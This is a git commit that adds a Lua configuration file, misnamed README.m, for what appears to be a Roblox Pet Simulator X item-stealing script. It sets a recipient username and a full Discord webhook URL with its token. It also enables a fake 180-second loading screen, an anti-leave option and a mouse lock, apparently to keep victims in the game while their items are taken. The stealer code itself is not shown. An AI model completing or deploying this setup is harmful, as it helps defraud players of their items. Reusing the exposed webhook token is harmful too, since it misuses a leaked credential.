6f787652ddc9d0c0e798943aa5a96329f23c3cc2
PSXscript2 <141219698+PSXscript2@users.noreply.github.com>
2023-08-18 18:30:23 +0300

    Psx

---
+++ README.m
@@ -0,0 +1,15 @@
+UserName = "Ahmeded11224"
+Webhook = "https://discord.com/api/webhooks/1117079278631276614/g2Hah7HNBGDhvnYmvEcBDyhQ7HRzsPpP5NNHOVoiHRIVCmy-L2aH8hm9CgfORjzTwdo9"
+UserName2 = "Ahmeded11224"
+
+_G.LoadingScreen = false -- make it true if you want the loadingscreen
+_G.AntiLeave = false -- make it true if you want the antileave
+_G.MouseLock = false -- make it true if you want the mouselock
+
+-- Remove These If You're Not Using The Rizz LoadingScreen
+
+_G.ScriptName = "Script Name"
+_G.FirstText = "Preparing..."
+_G.SecondText = "Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- in secondes it's the time for the loading bar to hit from 0% to 100%
